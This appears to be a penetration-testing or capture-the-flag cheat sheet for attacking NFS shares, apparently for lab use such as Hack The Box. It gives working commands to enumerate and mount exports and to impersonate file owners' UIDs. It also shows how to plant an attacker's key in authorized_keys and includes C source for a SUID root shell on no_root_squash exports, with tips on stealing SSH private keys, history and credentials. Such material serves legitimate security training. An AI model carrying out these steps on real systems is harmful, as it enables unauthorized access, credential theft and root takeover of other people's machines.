## Goal
List exports, mount, and read/steal files. Flag no_root_squash (privesc), and use writable exports for authorized_keys or a SUID shell. NFS leaks SSH keys and configs.

**Checklist**
- [ ] showmount lists exports?
- [ ] mounted and read files?
- [ ] UID mismatch blocking reads? (make a matching local user)
- [ ] `.ssh` writable? -> drop authorized_keys
- [ ] no_root_squash? -> SUID root shell (privesc)

# Commands

### Step 1: List exports
```bash
showmount -e $IP
rpcinfo -p $IP
nmap -p111,2049 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
```

### Step 2: Mount + read
```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs $IP:/share /mnt/nfs -o nolock,vers=3
sudo mount -t nfs $IP:/share /mnt/nfs -o nolock,vers=2    # version error? try 2
sudo mount -t nfs4 $IP:/share /mnt/nfs                    # or nfs4
find /mnt/nfs -type f -ls
ls -laR /mnt/nfs
```

### Step 3: UID mismatch (Permission denied on files)
```bash
ls -ln /mnt/nfs/                  # note the file owner's UID
sudo useradd -u 1000 fakeuser     # local user with that UID
sudo -u fakeuser cat /mnt/nfs/restricted_file.txt
```

### Step 4: Writable .ssh -> authorized_keys
```bash
ssh-keygen -f mykey -N ""
mkdir -p /mnt/nfs/.ssh
cat mykey.pub > /mnt/nfs/.ssh/authorized_keys
chmod 700 /mnt/nfs/.ssh ; chmod 600 /mnt/nfs/.ssh/authorized_keys
ssh -i mykey <user>@$IP
```

### Step 5: no_root_squash -> SUID root shell (privesc)
```bash
cat > /tmp/suid.c << 'CEOF'
#include <unistd.h>
int main(){ setuid(0); setgid(0); system("/bin/bash -p"); return 0; }
CEOF
gcc /tmp/suid.c -o /mnt/nfs/suid
chmod +s /mnt/nfs/suid
# on the target, as the NFS user:  /path/to/suid  -> root
```

### Helpline
```bash
# READING showmount -e / exports:
#   /home/<user> exported -> mount and grab .ssh/id_rsa, authorized_keys, .bash_history (pw in history).
#   / or /opt or /var exported -> mount and grep -ri "password|secret|key" for configs/source
#     (HTB Remote: NFS -> Umbraco DB -> admin hash -> RCE).   "* access" = anyone can mount.
# PRIVESC FLAG: "no_root_squash" in options = client root writes root-owned files -> drop a SUID shell
#   (privesc, see linux/10_nfs_no_root_squash). "root_squash" (default) still lets you read/write as the NFS user.
# GOTCHAS:
#   "Permission denied" on a file = UID MISMATCH -> ls -ln to read the owner UID, then useradd -u <uid> and su to it.
#   writable .ssh + SSH open -> inject authorized_keys (simpler than the SUID route).
#   database files (.db/.sqlite) -> sqlite3 file.db '.dump' or strings, look for creds.
```
